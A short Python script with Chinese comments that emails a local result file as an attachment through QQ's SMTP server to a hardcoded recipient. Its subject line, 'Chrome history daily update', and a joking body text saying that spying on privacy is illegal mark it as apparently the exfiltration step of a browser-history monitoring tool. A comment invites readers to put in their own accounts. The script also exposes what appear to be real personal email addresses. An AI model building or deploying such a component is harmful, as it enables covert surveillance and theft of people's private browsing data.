# -*- coding: utf-8 -*-
from email import encoders
from email.header import Header
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email.utils import parseaddr, formataddr
import smtplib
import argparse

# 1.文件执行的需要的参数(result.txt)
parser = argparse.ArgumentParser()
parser.add_argument('affix_file',help='the path of the affix')
args = parser.parse_args()


# 2.格式化一个邮件地址和邮件信息
def _format_addr(s):
    name, addr = parseaddr(s)
    return formataddr((Header(name, 'utf-8').encode(), addr))

#连接服务器(这里大家好改成自己的！)
from_addr = "771568102@qq.com" #发件人邮箱
password = "xxxxxxxx" #发件人邮箱授权码
to_addr = "2160802033@cnu.edu.cn" #收件人邮箱
smtp_server = "smtp.qq.com" #SMTP服务器地址

#邮件发件人名字、收件人名字、主题
msg = MIMEMultipart()
msg['From'] = _format_addr('风一样的女子 <%s>' % from_addr)
msg['To'] = _format_addr('风一样的男子 <%s>' % to_addr)
msg['Subject'] = Header('chrome历史记录每日更新', 'utf-8').encode()

# 邮件正文是MIMEText:
msg.attach(MIMEText('窥探隐私是犯法的啊！', 'plain', 'utf-8'))

# 添加附件就是加上一个MIMEBase，从本地读取一个txt文件:
with open(args.affix_file, 'r') as f:
    # 设置附件的MIME和文件名，这里是py类型:
    mime = MIMEBase('result', 'txt', filename='result.txt')
    # 加上必要的头信息:
    mime.add_header('Content-Disposition', 'attachment', filename='result.txt')
    mime.add_header('Content-ID', '<0>')
    mime.add_header('X-Attachment-Id', '0')
    # 把附件的内容读进来:
    mime.set_payload(f.read())
    # 用Base64编码:
    encoders.encode_base64(mime)
    # 添加到MIMEMultipart:
    msg.attach(mime)

#3.通过SMTP发送出去
server = smtplib.SMTP(smtp_server, 25)
server.set_debuglevel(1)
server.login(from_addr, password)
server.sendmail(from_addr, [to_addr], msg.as_string())
server.quit()